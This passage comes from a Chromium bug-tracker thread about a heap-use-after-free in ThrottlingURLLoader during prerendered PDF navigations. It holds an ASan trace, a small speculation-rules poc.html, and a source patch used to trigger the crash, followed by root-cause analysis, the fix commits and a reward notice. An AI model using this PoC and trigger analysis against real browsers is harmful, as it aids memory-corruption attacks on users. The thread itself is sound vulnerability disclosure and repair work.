    #13 0x10ea8f988 in base::internal::Invoker<base::internal::FunctorTraits<void (content::NavigationURLLoaderImpl::*&&)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl>&&, unsigned long&&>, base::internal::BindState<true, true, false, void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl>, unsigned long>, void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>::RunOnce(base::internal::BindStateBase*, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>&&)+0x11c (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15ef988)
    #14 0x10ea96920 in base::internal::Invoker<base::internal::FunctorTraits<content::(anonymous namespace)::NavigationLoaderInterceptorBrowserContainer::MaybeCreateLoader(network::ResourceRequest const&, content::BrowserContext*, base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (content::ResponseHeadUpdateParams)>)::'lambda'(base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>)&&, base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>&&>, base::internal::BindState<false, false, false, content::(anonymous namespace)::NavigationLoaderInterceptorBrowserContainer::MaybeCreateLoader(network::ResourceRequest const&, content::BrowserContext*, base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (content::ResponseHeadUpdateParams)>)::'lambda'(base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>), base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>>, void (base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>)>::RunOnce(base::internal::BindStateBase*, base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>&&)+0x548 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15f6920)
    #15 0x11a188278 in base::OnceCallback<void (base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>)>::Run(base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>) &&+0x160 (/Users/test/chromium/src/out/Default/libchrome_dll.dylib:arm64+0x2200278)
    #16 0x11b2e9748 in SearchPrefetchURLLoaderInterceptor::MaybeCreateLoader(network::ResourceRequest const&, content::BrowserContext*, base::OnceCallback<void (base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>)>)+0x1d0 (/Users/test/chromium/src/out/Default/libchrome_dll.dylib:arm64+0x3361748)
    #17 0x10ea96284 in content::(anonymous namespace)::NavigationLoaderInterceptorBrowserContainer::MaybeCreateLoader(network::ResourceRequest const&, content::BrowserContext*, base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (content::ResponseHeadUpdateParams)>)+0x1a0 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15f6284)
    #18 0x10ea80704 in content::NavigationURLLoaderImpl::MaybeStartLoader(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)+0x790 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15e0704)
    #19 0x10ea8fbbc in void base::internal::DecayedFunctorTraits<void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl>&&, unsigned long&&>::Invoke<void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl> const&, unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>>(void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl> const&, unsigned long&&, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>&&)+0x18c (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15efbbc)
    #20 0x10ea8f988 in base::internal::Invoker<base::internal::FunctorTraits<void (content::NavigationURLLoaderImpl::*&&)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl>&&, unsigned long&&>, base::internal::BindState<true, true, false, void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl>, unsigned long>, void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>::RunOnce(base::internal::BindStateBase*, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>&&)+0x11c (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15ef988)
    #21 0x10ea96920 in base::internal::Invoker<base::internal::FunctorTraits<content::(anonymous namespace)::NavigationLoaderInterceptorBrowserContainer::MaybeCreateLoader(network::ResourceRequest const&, content::BrowserContext*, base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (content::ResponseHeadUpdateParams)>)::'lambda'(base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>)&&, base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>&&>, base::internal::BindState<false, false, false, content::(anonymous namespace)::NavigationLoaderInterceptorBrowserContainer::MaybeCreateLoader(network::ResourceRequest const&, content::BrowserContext*, base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (content::ResponseHeadUpdateParams)>)::'lambda'(base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>), base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>>, void (base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>)>::RunOnce(base::internal::BindStateBase*, base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>&&)+0x548 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15f6920)
    #22 0x11a188278 in base::OnceCallback<void (base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>)>::Run(base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>) &&+0x160 (/Users/test/chromium/src/out/Default/libchrome_dll.dylib:arm64+0x2200278)
    #23 0x11a188094 in pdf::PdfURLLoaderRequestInterceptor::MaybeCreateLoader(network::ResourceRequest const&, content::BrowserContext*, base::OnceCallback<void (base::OnceCallback<void (network::ResourceRequest const&, mojo::PendingReceiver<network::mojom::URLLoader>, mojo::PendingRemote<network::mojom::URLLoaderClient>)>)>)+0xd4 (/Users/test/chromium/src/out/Default/libchrome_dll.dylib:arm64+0x2200094)
    #24 0x10ea96284 in content::(anonymous namespace)::NavigationLoaderInterceptorBrowserContainer::MaybeCreateLoader(network::ResourceRequest const&, content::BrowserContext*, base::OnceCallback<void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>, base::OnceCallback<void (content::ResponseHeadUpdateParams)>)+0x1a0 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15f6284)
    #25 0x10ea80704 in content::NavigationURLLoaderImpl::MaybeStartLoader(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)+0x790 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15e0704)
    #26 0x10ea8fbbc in void base::internal::DecayedFunctorTraits<void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl>&&, unsigned long&&>::Invoke<void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl> const&, unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>>(void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl> const&, unsigned long&&, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>&&)+0x18c (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15efbbc)
    #27 0x10ea8f988 in base::internal::Invoker<base::internal::FunctorTraits<void (content::NavigationURLLoaderImpl::*&&)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl>&&, unsigned long&&>, base::internal::BindState<true, true, false, void (content::NavigationURLLoaderImpl::*)(unsigned long, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>), base::WeakPtr<content::NavigationURLLoaderImpl>, unsigned long>, void (std::__Cr::optional<content::NavigationLoaderInterceptor::Result>)>::RunOnce(base::internal::BindStateBase*, std::__Cr::optional<content::NavigationLoaderInterceptor::Result>&&)+0x11c (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15ef988)
    #28 0x10ed11d40 in content::PrefetchURLLoaderInterceptor::OnGetPrefetchComplete(content::PrefetchContainer::Reader)+0x3f8 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x1871d40)
    #29 0x10ed13660 in void base::internal::DecayedFunctorTraits<void (content::PrefetchURLLoaderInterceptor::*)(content::PrefetchContainer::Reader), base::WeakPtr<content::PrefetchURLLoaderInterceptor>&&>::Invoke<void (content::PrefetchURLLoaderInterceptor::*)(content::PrefetchContainer::Reader), base::WeakPtr<content::PrefetchURLLoaderInterceptor> const&, content::PrefetchContainer::Reader>(void (content::PrefetchURLLoaderInterceptor::*)(content::PrefetchContainer::Reader), base::WeakPtr<content::PrefetchURLLoaderInterceptor> const&, content::PrefetchContainer::Reader&&)+0x134 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x1873660)

SUMMARY: AddressSanitizer: heap-use-after-free (/Users/test/chromium/src/out/Default/libblink_common.dylib:arm64+0x1e9738) in blink::ThrottlingURLLoader::OnReceiveResponse(mojo::StructPtr<network::mojom::URLResponseHead>, mojo::ScopedHandleBase<mojo::DataPipeConsumerHandle>, std::__Cr::optional<mojo_base::BigBuffer>)+0x7f8
Shadow bytes around the buggy address:
  0x618000246200: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x618000246280: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x618000246300: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x618000246380: fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x618000246400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa f7 fa
=>0x618000246480: fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x618000246500: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x618000246580: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x618000246600: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x618000246680: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x618000246700: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==4182==ADDITIONAL INFO

==4182==Note: Please include this section with the ASan report.
Task trace:
    #0 0x1020617e8 in mojo::SimpleWatcher::Context::Notify(unsigned int, MojoHandleSignalsState, unsigned int)+0x248 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x197e8)


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==4182==END OF ADDITIONAL INFO
==4182==ABORTING

```

poc.html

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Prerendering and PDF Loading Example</title>
    <script type="speculationrules">
    {
      "prerender": [
        {
          "source": "list",
          "urls": ["https://54e3-2400-d802-33c3-cd00-ed3c-b7d2-fb5d-b66.ngrok-free.app/test.pdf"]
        }
      ]
    }
    </script>
</head>

</html>

```

Note:
replace <https://54e3-2400-d802-33c3-cd00-ed3c-b7d2-fb5d-b66.ngrok-free.app> your https website in PoC.And You can use any pdf replace test.pdf.I use ngrok to simulate https
If you are using a real https website, you may not need the patch.

### pe...@google.com (2024-06-28)

Thank you for providing more feedback. Adding the requester to the CC list.

### ya...@chromium.org (2024-06-28)

[Navigation triage] hiroshige@, please take a look.

### ha...@gmail.com (2024-06-29)

And I think this vulnerability should be the same severity level P0/S0 as <https://issues.chromium.org/issues/40063127>, because it does not require any user interaction and is a browser crash.

### hi...@chromium.org (2024-07-02)

Thank you for reporting!

Hmm, strange.

As for the root cause and fix:

Initially, I thought `BeforeWillProcessResponse()` and `WillProcessResponse()` are not protected against cancellation during the callbacks and the proposed fix at [Comment #1](https://issues.chromium.org/issues/349342289#comment1) seems reasonable for this.
However, this is not the sole root cause, as simply cancelling the request in the callbacks doesn't cause crashes.
We have already a unit test for doing this for `WillProcessResponse()` at `ThrottlingURLLoaderTest.CancelBeforeResponse`:
<https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/common/loader/throttling_url_loader_unittest.cc;l=808;bpv=1;bpt=1>
and adding a similar unit test for `BeforeWillProcessResponse()` as well didn't crash.

On the second thought, it is more like a bug in `NavigationURLLoaderImpl::MaybeCreateLoaderForResponse()` that deletes the old ThrottlingURLLoader that is actually called later for some reasons, as the poc needed a modification in `HttpsUpgradesInterceptor::MaybeCreateLoaderForResponse()` to trigger the code.
But so far I'm still investigating the relationship between `MaybeCreateLoaderForResponse()` and `ThrottlingURLLoader::OnReceiveResponse()`.

As for the severity:

Is this reproducible without the patch in the POC?
So far I couldn't, and I expect the patched code path plays a role in the crash (by triggering ThrottlingURLLoader destruction in `NavigationURLLoaderImpl::MaybeCreateLoaderForResponse()`) so some additional steps or tweaks (if possible) is probably needed without the patch.

### hi...@chromium.org (2024-07-02)

Er, the call stack was there:

```
#1 0x10ea85e44 in content::NavigationURLLoaderImpl::MaybeCreateLoaderForResponse(network::URLLoaderCompletionStatus const&, mojo::StructPtr<network::mojom::URLResponseHead>*)+0x530 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15e5e44)
#2 0x10ea890c8 in content::NavigationURLLoaderImpl::OnComplete(network::URLLoaderCompletionStatus const&)+0x154 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x15e90c8)
#3 0x1358976e8 in blink::ThrottlingURLLoader::CancelWithExtendedError(int, int, std::__Cr::basic_string_view<char, std::__Cr::char_traits<char>>)+0x234 (/Users/test/chromium/src/out/Default/libblink_common.dylib:arm64+0x1eb6e8)
#4 0x13589edec in blink::ThrottlingURLLoader::ForwardingThrottleDelegate::CancelWithExtendedError(int, int, std::__Cr::basic_string_view<char, std::__Cr::char_traits<char>>)+0x128 (/Users/test/chromium/src/out/Default/libblink_common.dylib:arm64+0x1f2dec)
#5 0x11be26e50 in PluginResponseInterceptorURLLoaderThrottle::WillProcessResponse(GURL const&, network::mojom::URLResponseHead*, bool*)+0x97c (/Users/test/chromium/src/out/Default/libchrome_dll.dylib:arm64+0x3e9ee50)
#6 0x135895614 in blink::ThrottlingURLLoader::OnReceiveResponse(mojo::StructPtr<network::mojom::URLResponseHead>, mojo::ScopedHandleBase<mojo::DataPipeConsumerHandle>, std::__Cr::optional<mojo_base::BigBuffer>)+0x6d4 (/Users/test/chromium/src/out/Default/libblink_common.dylib:arm64+0x1e9614)

```

So

- Perhaps `ThrottlingURLLoader` should be protected against deleting itself in addition to just cancelling during throttle calls, and such unit tests should be added. The proposed fix at [Comment #1](https://issues.chromium.org/issues/349342289#comment1) adds the protection against deleting the loader (not just cancelling).
- But the crashing call stack itself looks awkward -- is it right to call `MaybeCreateLoaderForResponse()` synchronously during `WillProcessResponse()` throttle?
- Perhaps this can't be triggered without the patch, because the code path is probably not triggered for simple HTTPS requests while the cancellation code path in `PluginResponseInterceptorURLLoaderThrottle` is triggered only for prerendering requests that requires HTTPS. Other combination of triggering APIs might be still possible though.

### hi...@chromium.org (2024-07-02)

Draft CL: <https://chromium-review.googlesource.com/c/chromium/src/+/5665925>

Still I suspect the cases where `ThrottleURLLoader` is deleted synchronously during throttle calls should be avoided in the first place as they involve a kind of reentrancy which might be not intented, but anyway adding protection against such cases is needed and good for the short term.

### hi...@chromium.org (2024-07-02)

As for severity/impact, still I think we don't have cases (at least yet) that can occur in the wild without the patch.

The UaF occurs if

- (1) `URLLoaderThrottle::BeforeWillProcessResponse()` override or `URLLoaderThrottle::WillProcessResponse()` override triggers cancellation (or other `URLLoaderThrottle::Delegate` interaction), AND
- (2) That leads to synchronous `ThrottlingURLLoader` deletion.

One possible example is

- (1) `PluginResponseInterceptorURLLoaderThrottle::WillProcessResponse()` for prerendering requests (i.e. HTTPS requests)
- (2) `NavigationURLLoaderImpl::MaybeCreateLoaderForResponse()` + `HttpsUpgradesInterceptor` (probably for originally HTTP requests)
  but they don't occur for the same request and thus probably not directly reproducible in the wild.

Please let us know if any other combinations of triggers leads to the UaF (which is still possible), or if my analysis is wrong and this actually occur (which is also possible).

Adding HTTPS upgrades / SXG tags, as the users of (2) `MaybeCreateLoaderForResponse()`.

### ha...@gmail.com (2024-07-03)

The release path is released here. If interceptor->MaybeCreateLoaderForResponse is satisfied, reset at [1] causes the object to be deleted.

```
bool NavigationURLLoaderImpl::MaybeCreateLoaderForResponse(
    const network::URLLoaderCompletionStatus& status,
    network::mojom::URLResponseHeadPtr* response) {
  if (!default_loader_used_) {
    return false;
  }
  for (auto& interceptor : interceptors_) {
    mojo::PendingReceiver<network::mojom::URLLoaderClient>
        response_client_receiver;
    bool skip_other_interceptors = false;
    if (interceptor->MaybeCreateLoaderForResponse(
            status, *resource_request_, response, &response_body_,
            &response_url_loader_, &response_client_receiver, url_loader_.get(),
            &skip_other_interceptors)) {
      response_loader_receiver_.reset();
      response_loader_receiver_.Bind(
          std::move(response_client_receiver),
          GetUIThreadTaskRunner({BrowserTaskType::kNavigationNetworkResponse}));
      default_loader_used_ = false;
      url_loader_.reset();     // Consumed above.   //[1]
 ......


```

### ha...@gmail.com (2024-07-03)

tab\_helper->is\_navigation\_upgraded can be satisfied in the HttpsUpgradesNavigationThrottle::WillProcessResponse function [1].

```
   if (!tab_helper || !tab_helper->is_navigation_upgraded()) {
     return false;
   }

```
```
content::NavigationThrottle::ThrottleCheckResult
HttpsUpgradesNavigationThrottle::WillProcessResponse() {
  // Clear the status for this navigation as it will successfully commit.
  auto* tab_helper = HttpsOnlyModeTabHelper::FromWebContents(
      navigation_handle()->GetWebContents());
  if (tab_helper->is_navigation_upgraded()) {
    RecordHttpsFirstModeNavigation(Event::kUpgradeSucceeded,
                                   interstitial_state_);
    tab_helper->set_is_navigation_upgraded(false);  //[1]
  }

  // Clear the fallback flag, if set.
  tab_helper->set_is_navigation_fallback(false);

  return content::NavigationThrottle::PROCEED;
}

```

### ha...@gmail.com (2024-07-03)

So I think these conditions can be met under a real https domain without patching

### ap...@google.com (2024-07-08)

Project: chromium/src
Branch: main

commit c40f8866cfd6438725cc58e5db2d792e6d9f869b
Author: Hiroshige Hayashizaki <hiroshige@chromium.org>
Date:   Mon Jul 08 01:13:43 2024

    Handle ThrottlingURLLoader deletion during throttle calls
    
    Theoretically `ThrottlingURLLoader` can be deleted during
    throttle calls and some call sites have already protection
    for such cases. This CL adds the protection for more call sites.
    
    This CL also adds more unit tests for cancelling/deleting
    `ThrottlingURLLoader` during throttle calls.
    
    Bug: 349342289
    Change-Id: I80d64be9ba1a3ac920315f5b4012b29c9737e414
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5665925
    Commit-Queue: Hiroshige Hayashizaki <hiroshige@chromium.org>
    Reviewed-by: Tsuyoshi Horo <horo@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#1323986}

M       third_party/blink/common/loader/throttling_url_loader.cc
M       third_party/blink/common/loader/throttling_url_loader_unittest.cc

https://chromium-review.googlesource.com/5665925


### hi...@chromium.org (2024-07-11)

Should be fixed by <https://chromium-review.googlesource.com/c/chromium/src/+/5665925> (confirmed that local build with the POC patch no longer crashes).

Still we don't have POC without patching Chromium, but anyway requesting merge to M-127, as this is a security issue.

### pe...@google.com (2024-07-11)

Merge review required: M127 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), eakpobaro (iOS), alonbajayo (ChromeOS), danielyip (Desktop)

### hi...@chromium.org (2024-07-11)

1. Why does your merge fit within the merge criteria for these milestones?
   security issue.
2. What changes specifically would you like to merge? Please link to Gerrit.
   <https://chromium-review.googlesource.com/c/chromium/src/+/5665925>
3. Have the changes been released and tested on canary?
   Yes.
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
   No.
5. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.
   No.

### hi...@chromium.org (2024-07-11)

Discussed with nhiroki@ and there might be (or might not be) in-the-wild cases e.g. `http://example.com/foo.pdf` is auto-upgraded to HTTPS and attempted to be prerendered by non-speculation-rules triggers (e.g. omnibox), and then canceled because plugin+prerender is rejected.
(Still no actual POCs without patch though)

### ha...@gmail.com (2024-07-11)

Does this happen? <http://www.google.com> will automatically auto-upgrade to HTTPS to <https://www.google.com>, so if you put the pdf in the real domain name, do you not need to patch it? Because when I tested it, I patched the following code, and I successfully reproduced ASAN by directly using <http://www.google.com>.

```
std::string extension_id = PluginUtils::GetExtensionIdForMimeType(
web_contents->GetBrowserContext(), response_head->mime_type);

- if (extension_id.empty())
- return;
+ //if (extension_id.empty())
+ //return;

// TODO(crbug.com/40180674): Support prerendering of MimeHandlerViews.
- if (web_contents->IsPrerenderedFrame(frame_tree_node_id_)) {
+ if (!web_contents->IsPrerenderedFrame(frame_tree_node_id_)) {
delegate_->CancelWithError(
net::Error::ERR_BLOCKED_BY_CLIENT,
"MimeHandler prerendering support not implemented.");
return;
}

```

### hi...@chromium.org (2024-07-11)

The key point here is, BOTH of (1) and (2) (in [Comment #13](https://issues.chromium.org/issues/349342289#comment13)) should happen for the same navigation.
(1) is only for prerendering requests, (2) is only for HTTP-to-HTTPS-upgraded requests, so the question is (1) && (2), i.e.

- (Q): Is there HTTP-to-HTTPS-upgraded prerendering requests causing UaF? Can we create a POC without patching Chromium?

(1) can happen, (2) can happen, and relaxing the conditions for (1)/(2) results in UaF for much broader cases (the patch at [Comment #22](https://issues.chromium.org/issues/349342289#comment22) removes the prerendering-only condition for (1), and the patch at [Comment #6](https://issues.chromium.org/issues/349342289#comment6) removes the HTTP-to-HTTPS-upgraded-only condition for (2)), but these doesn't answer to (Q). Probably we should figure out an actual scenario without any patches.

Anyway, even without the POC, this issue is a valid issue with potential security impacts because ThrottlingURLLoader is not protected against deletion in certain points, and because it take a long time to prove the UaF actually happens (or doesn't happen) in the wild, I think it's safer to merge the patch to beta, assuming the UaF can potentially occur. I defer further prioritization/merge decision to security folks.

> if you put the pdf in the real domain name, do you not need to patch it

So I'm just not sure, and UaF with the patch doesn't mean that UaF can happen in the wild, because the patch removes the very key restriction in (1) that prevents UaF in simple cases in the wild.

### ha...@gmail.com (2024-07-11)

yep, it’s hard to be sure at the moment, because I don’t have a real https domain name, otherwise I can try a POC that doesn’t require any patches at all

### am...@chromium.org (2024-07-12)

<https://crrev.com/c/5665925> approved for merge to M127; please merge this fix to branch 6533 before EOD Monday, 15 July so this fix can be included in M127 final beta and M127 Stable RC being cut on Tuesday for release the following week.

### da...@google.com (2024-07-15)

Reminder: M127 will be promoting to early stable this Wednesday, please ensure your changes land in the M127 branch by COP tomorrow to ensure that your changes are included in the release.

### ap...@google.com (2024-07-16)

Project: chromium/src
Branch: refs/branch-heads/6533

commit 44b7fbf35b10d81c2882a18b28580f943a07c86a
Author: Hiroshige Hayashizaki <hiroshige@chromium.org>
Date:   Tue Jul 16 03:44:29 2024

    [M127] Handle ThrottlingURLLoader deletion during throttle calls
    
    Theoretically `ThrottlingURLLoader` can be deleted during
    throttle calls and some call sites have already protection
    for such cases. This CL adds the protection for more call sites.
    
    This CL also adds more unit tests for cancelling/deleting
    `ThrottlingURLLoader` during throttle calls.
    
    (cherry picked from commit c40f8866cfd6438725cc58e5db2d792e6d9f869b)
    
    Bug: 349342289
    Change-Id: I80d64be9ba1a3ac920315f5b4012b29c9737e414
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5665925
    Commit-Queue: Hiroshige Hayashizaki <hiroshige@chromium.org>
    Reviewed-by: Tsuyoshi Horo <horo@chromium.org>
    Cr-Original-Commit-Position: refs/heads/main@{#1323986}
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5710951
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
    Reviewed-by: Kouhei Ueno <kouhei@chromium.org>
    Cr-Commit-Position: refs/branch-heads/6533@{#1515}
    Cr-Branched-From: 7e0b87ec6b8cb5cb2969e1479fc25776e582721d-refs/heads/main@{#1313161}

M       third_party/blink/common/loader/throttling_url_loader.cc
M       third_party/blink/common/loader/throttling_url_loader_unittest.cc

https://chromium-review.googlesource.com/5710951


### pe...@google.com (2024-07-16)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### hi...@chromium.org (2024-07-16)

1. Was this issue a regression for the milestone it was found in?

No.

2. Is this issue related to a change or feature merged after the latest LTS Milestone?

No.

### sp...@google.com (2024-07-17)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $8000.00 for this report.

Rationale for this decision:
$7,000 for report of memory corruption in a sandboxed process + $1,000 bisect bonus


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### ha...@gmail.com (2024-07-17)

Hello，
This crash happen in browser process,not in tab.is it in a sandboxed process?VRP,Can you re-evaluate?

### am...@chromium.org (2024-07-24)

Hi -- apologies for our error in the assessment of the impacted process. You are correct that this speculative UAF would manifest in the browser process. This issue is in third\_party/blink/common which is code shared in between the renderer and the browser.
